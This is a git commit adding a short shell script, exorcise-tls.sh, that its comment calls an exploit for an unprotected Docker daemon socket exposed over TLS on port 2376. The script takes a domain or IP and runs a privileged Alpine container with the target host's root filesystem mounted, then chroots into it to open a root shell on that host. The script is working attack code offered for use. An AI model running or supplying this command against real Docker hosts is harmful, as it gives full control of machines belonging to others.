cc9aeca574c45b31fcccf7db7b8cf295fe553af2
Othmane Tamagart <SQLi@outlook.fr>
2020-09-23 12:47:04 +0100

    Upload exorcise-tls.sh

---
+++ exorcise-tls.sh
@@ -0,0 +1,16 @@
+# Script to exploit the Docker Daemon - Unprotected TCP Socket BUT over TLS (port:2376)
+
+
+if [ -z "$1" ]
+then
+        echo "Usage: ./exorcise-tls.sh <DONMAIN.COM/IP>"
+        exit 1
+fi
+
+declare domain=$1
+
+echo "Exploiting..."
+
+declare domain=$1
+
+docker -H tcp://${domain}:2376 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
